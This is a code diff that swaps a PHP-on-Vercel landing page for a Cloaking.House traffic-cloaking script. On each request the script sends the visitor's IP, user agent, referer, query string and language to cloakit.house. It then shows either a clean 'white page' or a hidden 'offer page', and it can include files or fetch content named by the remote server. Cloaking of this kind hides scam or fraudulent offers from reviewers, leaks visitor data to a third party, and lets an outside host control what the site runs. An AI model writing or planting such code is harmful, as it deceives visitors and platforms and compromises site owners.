@@ -1,41 +1,144 @@
-<!DOCTYPE html>
-<html lang="en" data-bs-theme="dark">
-<head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title><?="PHP + Vercel";?></title>
-  <link rel="shortcut icon" href="../public/images/favicon.png" type="image/x-icon">
-  <link rel="stylesheet" href="../vendor/twbs/bootstrap-icons/font/bootstrap-icons.css">
-  <link rel="stylesheet" href="../public/styles/styles.css">
-  <link rel="stylesheet" href="../public/styles/bootstrap.min.css">
-</head>
-<body class="d-flex min-vh-100 text-center">
-  <main class="d-flex container-lg mx-auto flex-column">
-    <header class="pt-5">
-        <div class="d-flex w-50 align-items-center justify-content-center mx-auto">
-          <div>
-            <img class="img-fluid" src="../public/images/php-vercel.svg" alt="">
-          </div>
-        </div>
-      </header>
-      <div>
-        <h1 class="mt-5">Deploy PHP Application to Vercel</h1>
-        <div class="row">
-          <div class="col-lg-8 col-12 mx-auto">
-            <p class="lead">
-              Do you have a PHP application project but only stored on your local machine? Now with Vercel you can deploy your application to the internet!
-            </p>
-          </div>
-        </div>
-        <a class="btn btn-lg btn-outline-light" href="/api/tutorial.php" role="button">Learn more</a>
-      </div>
-      <footer class="mt-auto text-white-50">
-        <p>Insipired by <a href="https://github.com/vercel-community/php" class="text-white">@vercel-community</a> and <a href="https://github.com/juicyfx/vercel-examples" class="text-white">@juicyfx</a></p>
-        <img src="" alt="">
-      </footer>
-    </main>
-  <script src="../public/scripts/scripts.js"></script>
-  <script src="../public/scripts/bootstrap.bundle.min.js"></script>
-</body>
-</html>
+<?php
+
+    // Не рекомендуется вносить самостоятельно изменения в скрипт, так как любые последствия неработоспособности будут лежать на вас.
+    // С уважением, Cloaking.House
+
+
+    // It is not recommended to make changes to this script on your own, as any consequences of malfunction will be your responsibility.
+    // Sincerely, Cloaking.House
+
+
+
+    error_reporting(0);
+    mb_internal_encoding('UTF-8');
+
+
+    if (version_compare(PHP_VERSION, '7.2', '<')) {
+        exit('PHP 7.2 or higher is required.');
+    }
+
+    
+    $ip_address = $_SERVER['REMOTE_ADDR'];
+    $ip_headers = [
+        'HTTP_CLIENT_IP', 
+        'HTTP_X_FORWARDED_FOR', 
+        'HTTP_CF_CONNECTING_IP', 
+        'HTTP_FORWARDED_FOR', 
+        'HTTP_X_COMING_FROM', 
+        'HTTP_COMING_FROM', 
+        'HTTP_FORWARDED_FOR_IP', 
+        'HTTP_X_REAL_IP'
+    ];
+
+    
+    if ( ! empty($ip_headers)) {
+        foreach($ip_headers AS $header)
+        {
+            if ( ! empty($_SERVER[$header])) {
+                $ip_address = trim($_SERVER[$header]);
+                break;
+            }
+        }
+    }
+
+
+    $request_data = [
+        'label'         => '9ec4851e83c42b88662985f2ffd8489a', 
+        'user_agent'    => $_SERVER['HTTP_USER_AGENT'], 
+        'referer'       => ! empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '', 
+        'query'         => ! empty($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '', 
+        'lang'          => ! empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '',
+        'ip_address'    => $ip_address
+    ];
+        
+
+    if (function_exists('curl_version')) {
+
+        $request_data = http_build_query($request_data);
+        $ch = curl_init('https://cloakit.house/api/v1/check');
+        curl_setopt_array($ch, [
+            CURLOPT_RETURNTRANSFER  => TRUE,
+            CURLOPT_CUSTOMREQUEST   => 'POST',
+            CURLOPT_SSL_VERIFYPEER  => FALSE,
+            CURLOPT_TIMEOUT         => 15,
+            CURLOPT_POSTFIELDS      => $request_data
+        ]);
+
+
+        $result = curl_exec($ch);
+        $info   = curl_getinfo($ch);
+        curl_close($ch);
+
+
+        if ( ! empty($info) && $info['http_code'] == 200) {
+            $body = json_decode($result, TRUE);
+
+            
+            if ( ! empty($body['filter_type']) && $body['filter_type'] == 'subscription_expired') {
+                exit('Your Subscription Expired.');
+            }
+           
+
+            if ( ! empty($body['url_white_page']) && ! empty($body['url_offer_page'])) {
+
+                // Options
+                $сontext_options = ['ssl' => ['verify_peer' => FALSE, 'verify_peer_name' => FALSE], 'http' => ['header' => 'User-Agent: ' . $_SERVER['HTTP_USER_AGENT']]];
+                
+                // Offer Page
+                if ($body['filter_page'] == 'offer') {
+                    if ($body['mode_offer_page'] == 'loading') {
+                        if (filter_var($body['url_offer_page'], FILTER_VALIDATE_URL)) {
+                            echo str_replace('<head>', '<head><base href="' . $body['url_offer_page'] . '" />', file_get_contents($body['url_offer_page'], FALSE, stream_context_create($сontext_options)));
+                        } elseif (file_exists($body['url_offer_page'])) {
+                            if (pathinfo($body['url_offer_page'], PATHINFO_EXTENSION) == 'html') {
+                                echo file_get_contents($body['url_offer_page'], FALSE, stream_context_create($сontext_options));
+                            } else {
+                                require_once($body['url_offer_page']);
+                            }
+                        } else {
+                            exit('Offer Page Not Found.');
+                        }
+                    }
+
+                    if ($body['mode_offer_page'] == 'redirect') {
+                        header('Location: ' . $body['url_offer_page'], TRUE, 302);
+                        exit(0);
+                    }
+
+                    if ($body['mode_offer_page'] == 'iframe') {
+                        echo '<iframe src="' . $body['url_offer_page'] . '" width="100%" height="100%" align="left"></iframe> <style> body { padding: 0; margin: 0; } iframe { margin: 0; padding: 0; border: 0; } </style>';
+                    }
+                }
+
+
+                // White Page
+                if ($body['filter_page'] == 'white') {
+                    if ($body['mode_white_page'] == 'loading') {
+                        if (filter_var($body['url_white_page'], FILTER_VALIDATE_URL)) {
+                            echo str_replace('<head>', '<head><base href="' . $body['url_white_page'] . '" />', file_get_contents($body['url_white_page'], FALSE, stream_context_create($сontext_options)));
+                        } elseif (file_exists($body['url_white_page'])) {
+                            if (pathinfo($body['url_white_page'], PATHINFO_EXTENSION) == 'html') {
+                                echo file_get_contents($body['url_white_page'], FALSE, stream_context_create($сontext_options));
+                            } else {
+                                require_once($body['url_white_page']);
+                            }
+                        } else {
+                            exit('White Page Not Found.');
+                        }
+                    }
+
+                    if ($body['mode_white_page'] == 'redirect') {
+                        header('Location: ' . $body['url_white_page'], TRUE, 302);
+                        exit(0);
+                    }
+                }
+            } 
+        } else {
+            exit('Try again later.');
+        }
+    } else {
+        exit('cURL is not supported on the hosting.');
+    }
+
+
+?>
